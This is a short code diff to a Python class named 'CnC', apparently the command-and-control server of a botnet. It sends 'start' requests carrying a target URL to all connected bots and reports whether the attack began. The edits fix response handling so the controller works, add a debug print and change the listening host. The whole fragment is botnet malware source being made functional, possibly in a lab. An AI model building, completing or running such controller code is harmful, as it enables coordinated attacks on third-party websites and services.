@@ -147,10 +147,11 @@ class CnC:
                 return "No bot connected."
             responses = set()
             for url in urls:
-                responses.union({
+                responses = responses.union({
                     requests.post(f"http://{address}:{port}/start", json={'url': url}).status_code
                     for address, port in self.__bots.items()
                 })
+            print(responses)
         if len(responses) == 1 and responses.pop() != 200:
             return "Attack did not start..."
         return "Attack started successfully!"
@@ -240,7 +241,7 @@ class CnC:
             return "Command not recognized."
 
 
-HOST = '10.0.2.15'
+HOST = '127.0.0.1'  #'10.0.2.15'
 PORT = 60000
 
 if __name__ == '__main__':
